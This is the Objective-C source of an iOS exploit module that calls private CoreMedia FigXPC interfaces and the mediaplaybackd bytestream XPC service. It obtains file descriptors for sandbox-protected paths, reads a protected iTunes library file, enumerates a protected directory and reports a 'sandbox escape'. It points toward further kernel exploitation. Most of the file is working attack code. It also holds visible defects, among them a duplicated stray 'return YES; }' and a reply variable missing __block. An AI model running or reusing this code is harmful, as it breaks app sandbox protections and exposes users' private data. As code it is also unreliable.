#import "KPFDLeakModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <dlfcn.h>
#import <xpc/xpc.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>
#include <dirent.h>

// FigXPC function pointers (loaded via dlsym)
static void *(*figXPCCreateBasicMessage)(uint32_t, void *);
static void (*figXPCMessageSetCFURL)(void *, const char *, void *);
static int (*figXPCMessageGetCFURL)(void *, const char *, void **);
static void (*figXPCConnectionSetMessageHandler)(void *, void *);
static void (*figXPCConnectionResume)(void *);
static void *(*figXPCConnectionCreateMachService)(const char *, void *, uint64_t);
static int (*figXPCMessageGetCFDictionary)(void *, const char *, void **);
static void (*figXPCMessageSetCFDictionary)(void *, const char *, void *);
static void (*figXPCMessageSetInt32)(void *, const char *, int32_t);
static int (*figXPCMessageGetInt32)(void *, const char *, int32_t *);
static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);

@interface KPFDLeakModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPFDLeakModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"fdleak112706";
        _title = @"CoreMedia fd leak (sandbox escape)";
        _subtitle = @"CVE-2026-112706: mediaplaybackd vends fds for protected paths";
        _icon = @"lock.open";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-fdleak-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[fdleak] %@", line];
}

- (BOOL)loadFigXPC {
    void *h = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
    if (!h) {
        [self journal:@"dlopen CoreMedia failed"];
        return NO;
    }

    // FigXPC functions from CoreMedia
    figXPCCreateBasicMessage = dlsym(h, "FigXPCCreateBasicMessage");
    figXPCMessageSetCFURL = dlsym(h, "FigXPCMessageSetCFURL");
    figXPCMessageGetCFDictionary = dlsym(h, "FigXPCMessageGetCFDictionary");

    // FigMemoryOrigin handshake functions
    static void *(*figMemOriginBegin)(void *, void *);
    static int (*figMemOriginComplete)(void *, void *);
    static void *(*figMemRecipientCreate)(void *, void *);
    figMemOriginBegin = dlsym(h, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
    figMemOriginComplete = dlsym(h, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
    figMemRecipientCreate = dlsym(h, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");

    [self journal:[NSString stringWithFormat:@"FigXPCCreateBasicMessage: %p", figXPCCreateBasicMessage]];
    [self journal:[NSString stringWithFormat:@"FigXPCMessageSetCFURL: %p", figXPCMessageSetCFURL]];
    [self journal:[NSString stringWithFormat:@"FigMemoryOrigin*: %p %p %p", figMemOriginBegin, figMemOriginComplete, figMemRecipientCreate]];

    if (!figXPCCreateBasicMessage) {
        [self journal:@"FigXPCCreateBasicMessage not found"];
        return NO;
    }

    [self journal:@"FigXPC functions loaded"];
    return YES;
}
    return YES;
}

- (int)stealFD:(NSString *)filePath {
    // Use raw XPC for connection (not FigXPC)
    xpc_connection_t conn = xpc_connection_create_mach_service(
        "com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
    if (!conn) {
        [self journal:@"XPC connection failed"];
        return -1;
    }
    [self journal:@"XPC connection created (raw)"];

    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
        // Handle events
    });
    xpc_connection_resume(conn);

    // Handshake via FigXPC message creation + raw XPC send
    for (NSString *opStr in @[@".rp1", @".rp2", @".org"]) {
        uint32_t opcode = 0;
        memcpy(&opcode, opStr.UTF8String, 4);
        void *msg = figXPCCreateBasicMessage(opcode, NULL);
        if (!msg) {
            [self journal:[NSString stringWithFormat:@"create %@ failed", opStr]];
            continue;
        }
        xpc_object_t reply = NULL;
        xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t r) {
            reply = r;
        });
        // Wait a bit for reply
        usleep(100000);
        [self journal:[NSString stringWithFormat:@"handshake %@: reply=%p", opStr, reply]];
    }

    // Curl create with CreationURL
    uint32_t curlOp = 'Curl';
    void *curlMsg = figXPCCreateBasicMessage(curlOp, NULL);
    if (!curlMsg) {
        [self journal:@"Curl message create failed"];
        return -1;
    }

    NSString *urlStr = [NSString stringWithFormat:@"file://%@", filePath];
    CFURLRef url = CFURLCreateWithString(NULL, (__bridge CFStringRef)urlStr, NULL);
    figXPCMessageSetCFURL(curlMsg, "CreationURL", url);
    CFRelease(url);
    [self journal:[NSString stringWithFormat:@"Curl create: %@", urlStr]];

    __block xpc_object_t curlReply = NULL;
    xpc_connection_send_message_with_reply(conn, curlMsg, NULL, ^(xpc_object_t r) {
        curlReply = r;
    });
    usleep(200000);

    if (!curlReply) {
        [self journal:@"Curl reply is NULL"];
        xpc_connection_cancel(conn);
        return -1;
    }

    // Extract fd from ByteStreamDetails -> FileDescriptor
    xpc_object_t details = xpc_dictionary_get_value(curlReply, "ByteStreamDetails");
    if (details) {
        int fd = xpc_dictionary_dup_fd(details, "FileDescriptor");
        [self journal:[NSString stringWithFormat:@"GOT FD: %d", fd]];
        xpc_connection_cancel(conn);
        return fd;
    }

    // Try direct fd in reply
    int fd = xpc_dictionary_dup_fd(curlReply, "FileDescriptor");
    if (fd >= 0) {
        [self journal:[NSString stringWithFormat:@"GOT FD (direct): %d", fd]];
    } else {
        [self journal:@"No FileDescriptor in reply"];
    }

    xpc_connection_cancel(conn);
    return fd;
}
- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112706 fd leak ===\n"];
    [report appendString:@"Sandbox escape via CoreMedia bytestream XPC.\n"];
    [report appendString:@"mediaplaybackd vends fds for protected paths.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Load FigXPC functions
    [report appendString:@"\n--- Phase 1: load FigXPC ---\n"];
    if (![self loadFigXPC]) {
        [report appendString:@"\nVERDICT: FIGXPC_LOAD_FAILED\n"];
        return report;
    }
    [report appendString:@"FigXPC loaded OK\n"];

    // Try to steal fd for a protected file
    [report appendString:@"\n--- Phase 2: fd steal ---\n"];

    // Target: iTunes_Control (known readable domain)
    NSString *target = @"/private/var/mobile/Media/iTunes_Control/iTunes/iTunes Library.itlp";
    [report appendFormat:@"target: %@\n", target];

    // First, verify we can't open it directly (sandbox blocks)
    int directFd = open(target.fileSystemRepresentation, O_RDONLY);
    if (directFd >= 0) {
        [report appendFormat:@"direct open: OK (fd=%d) — not sandboxed?\n", directFd];
        close(directFd);
    } else {
        [report appendFormat:@"direct open: EPERM (%d) — sandbox active\n", errno];
    }

    // Now try fd leak
    int stolenFd = [self stealFD:target];
    if (stolenFd >= 0) {
        [report appendFormat:@"STOLEN FD: %d\n", stolenFd];

        // Read file content
        struct stat st;
        if (fstat(stolenFd, &st) == 0) {
            [report appendFormat:@"file size: %lld bytes\n", (long long)st.st_size];
        }

        // Read first 256 bytes
        uint8_t buf[256] = {0};
        ssize_t n = pread(stolenFd, buf, sizeof(buf), 0);
        if (n > 0) {
            [report appendFormat:@"read %zd bytes:", n];
            for (ssize_t i = 0; i < n && i < 64; i++) {
                [report appendFormat:@" %02x", buf[i]];
            }
            [report appendString:@"\n"];

            // Check if data looks valid
            if (n > 4) {
                [report appendString:@"*** FD LEAK CONFIRMED — sandbox escape! ***\n"];
            }
        } else {
            [report appendFormat:@"pread failed: %zd (errno=%d)\n", n, errno];
        }

        close(stolenFd);
    } else {
        [report appendString:@"fd leak failed\n"];
    }

    // Try directory enumeration
    [report appendString:@"\n--- Phase 3: directory enumeration ---\n"];
    NSString *dirPath = @"/private/var/mobile/Media/iTunes_Control/iTunes/";
    int dirFd = [self stealFD:dirPath];
    if (dirFd >= 0) {
        [report appendFormat:@"directory fd: %d\n", dirFd];
        DIR *d = fdopendir(dirFd);
        if (d) {
            struct dirent *ent;
            int count = 0;
            while ((ent = readdir(d)) != NULL && count < 10) {
                [report appendFormat:@"  %s\n", ent->d_name];
                count++;
            }
            closedir(d);
        }
    } else {
        [report appendFormat:@"directory fd steal failed\n"];
    }

    // Verdict
    [report appendString:@"\n"];
    if (stolenFd >= 0) {
        [report appendString:@"VERDICT: FD_LEAK_CONFIRMED\n"];
        [report appendString:@"Sandbox escape via fd steal WORKS on this device.\n"];
        [report appendString:@"Next: use fd for kernel access or further exploitation.\n"];
    } else {
        [report appendString:@"VERDICT: FD_LEAK_FAILED\n"];
        [report appendString:@"May be patched on this build, or wrong target path.\n"];
    }

    return report;
}

@end
